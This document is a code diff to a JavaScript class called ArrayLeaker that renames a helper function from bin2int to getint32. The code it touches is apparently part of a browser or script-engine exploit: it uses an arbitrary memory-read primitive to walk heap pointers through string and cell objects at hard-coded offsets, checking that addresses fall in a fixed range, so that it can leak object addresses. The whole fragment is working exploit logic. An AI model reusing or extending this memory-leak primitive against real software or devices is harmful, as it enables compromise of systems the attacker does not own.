@@ -33,19 +33,19 @@ class ArrayLeaker {
 			return false;
 		}
 		
-		var addrStrObjPtr = Util.bin2int(str.substr(2, 2));
+		var addrStrObjPtr = Util.getint32(str.substr(2, 2));
 		if (addrStrObjPtr < 0x80000000 || 0x8fffffff < addrStrObjPtr) {
 			return false;
 		}
 		
 		str = this.memoryReader.read(addrStrObjPtr + 0x8, 4);
-		var addrStrObj = Util.bin2int(str);
+		var addrStrObj = Util.getint32(str);
 		if (addrStrObj < 0x80000000 || 0x8fffffff < addrStrObj) {
 			return false;
 		}
 		
 		str = this.memoryReader.read(addrStrObj + 0x18, 4);
-		var addrStr = Util.bin2int(str);
+		var addrStr = Util.getint32(str);
 		if (addrStr < 0x80000000 || 0x8fffffff < addrStr) {
 			return false;
 		}
@@ -78,37 +78,37 @@ class ArrayLeaker {
 			return null;
 		}
 		
-		var addrCellPtr = Util.bin2int(str.substr(2, 2));
+		var addrCellPtr = Util.getint32(str.substr(2, 2));
 		if (addrCellPtr < 0x80000000 || 0x8fffffff < addrCellPtr) {
 			return null;
 		}
 		
 		str = this.memoryReader.read(addrCellPtr + 0x8, 0x4);
-		var addrValue = Util.bin2int(str);
+		var addrValue = Util.getint32(str);
 		if (addrValue < 0x80000000 || 0x8fffffff < addrValue) {
 			return null;
 		}
 		
 		str = this.memoryReader.read(addrValue, 0x40);
 		var addrStr = null;
-		var ptr1 = Util.bin2int(str.substr(10, 2));
+		var ptr1 = Util.getint32(str.substr(10, 2));
 		if (ptr1 !== 0) {
 			// Longer string
 			// Could break, not 100% sure on this
 			
 			var strOff = 0;
-			var firstInt = Util.bin2int(str.substr(0, 2));
+			var firstInt = Util.getint32(str.substr(0, 2));
 			if (firstInt === 0xffffffae) {
 				strOff = 0x7c;
  			}			
 			
-			var addr2 = Util.bin2int(str.substr(10, 2));
+			var addr2 = Util.getint32(str.substr(10, 2));
 			if (addr2 < 0x80000000 || 0x8fffffff < addr2) {
 				return null;
 			}
 			
 			str = this.memoryReader.read(addr2 + 0x18, 0x4);
-			var addr3 = Util.bin2int(str);
+			var addr3 = Util.getint32(str);
 			if (addr3 < 0x80000000 || 0x8fffffff < addr3) {
 				return null;
 			}
@@ -116,7 +116,7 @@ class ArrayLeaker {
 			addrStr = addr3 + strOff;
 		} else {
 			// Shorter string
-			addrStr = Util.bin2int(str.substr(12, 2));
+			addrStr = Util.getint32(str.substr(12, 2));
 		}
 		
 		if (addrStr < 0x80000000 || 0x8fffffff < addrStr) {
